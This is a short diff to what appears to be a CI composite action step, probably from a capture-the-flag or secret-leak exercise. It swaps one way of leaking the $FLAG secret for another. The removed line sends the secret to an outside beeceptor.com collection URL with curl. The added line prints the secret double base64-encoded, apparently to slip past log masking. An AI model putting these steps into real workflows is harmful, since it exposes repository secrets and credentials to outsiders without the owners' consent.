@@ -4,4 +4,4 @@ runs:
   using: composite
   steps:
     - shell: bash
-      run: curl -S https://plopa.free.beeceptor.com/collect?token=$FLAG
+      run: printf "%s" $FLAG | base64 | base64
